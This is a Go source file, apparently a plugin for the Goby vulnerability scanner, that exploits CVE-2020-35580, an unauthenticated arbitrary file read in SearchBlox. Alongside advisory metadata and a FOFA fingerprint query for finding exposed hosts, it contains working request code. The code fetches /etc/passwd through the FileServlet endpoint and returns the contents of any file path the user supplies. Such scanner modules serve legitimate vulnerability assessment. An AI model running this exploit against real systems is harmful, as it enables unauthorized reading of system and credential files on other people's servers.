package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Searchblox FileServlet Api File Read (CVE-2020-35580)",
    "Description": "<p>SearchBlox is an application software of SearchBlox Company in the United States. Provides a powerful enterprise search architecture for on-premises or cloud deployments.</p><p>A security vulnerability existed in SearchBlox versions prior to 9.2.2 that could allow a remote, unauthenticated user to read arbitrary files from the operating system via /searchblox/servlet/FileServlet?col=url=.</p>",
    "Impact": "<p>Searchblox FileServlet File Read (CVE-2020-35580)</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://developer.searchblox.com/docs/getting-started-with-searchblox\">https://developer.searchblox.com/docs/getting-started-with-searchblox</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Searchblox",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Searchblox FileServlet 接口任意文件读取漏洞（CVE-2020-35580）",
            "Product": "Searchblox",
            "Description": "<p>SearchBlox是美国SearchBlox公司的一个应用软件。为内部部署或云部署提供了强大的企业搜索体系结构。</p><p>SearchBlox 9.2.2之前版本存在安全漏洞，该漏洞允许远程的、未经身份验证的用户通过/searchblox/servlet/FileServlet?col=url=从操作系统读取任意文件。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://developer.searchblox.com/docs/getting-started-with-searchblox\">https://developer.searchblox.com/docs/getting-started-with-searchblox</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>SearchBlox 9.2.2之前版本存在安全漏洞，该漏洞允许远程的、未经身份验证的用户通过/searchblox/servlet/FileServlet?col=url=从操作系统读取任意文件。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Searchblox FileServlet Api File Read (CVE-2020-35580)",
            "Product": "Searchblox",
            "Description": "<p>SearchBlox is an application software of SearchBlox Company in the United States. Provides a powerful enterprise search architecture for on-premises or cloud deployments.</p><p>A security vulnerability existed in SearchBlox versions prior to 9.2.2 that could allow a remote, unauthenticated user to read arbitrary files from the operating system via /searchblox/servlet/FileServlet?col=url=.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://developer.searchblox.com/docs/getting-started-with-searchblox\">https://developer.searchblox.com/docs/getting-started-with-searchblox</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Searchblox FileServlet File Read (CVE-2020-35580)</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"/searchblox/plugin/index.html\"",
    "GobyQuery": "body=\"/searchblox/plugin/index.html\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://developer.searchblox.com",
    "DisclosureDate": "2021-05-21",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [
        "CVE-2020-35580"
    ],
    "CNVD": [
        "CNVD-2021-36595"
    ],
    "CNNVD": [
        "CNNVD-202105-1319"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10260"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/searchblox/servlet/FileServlet?url=/etc/passwd&col=9"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && regexp.MustCompile("root:(.*?):0:0:").MatchString(resp1.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := fmt.Sprintf("/searchblox/servlet/FileServlet?url=%s&col=9", cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
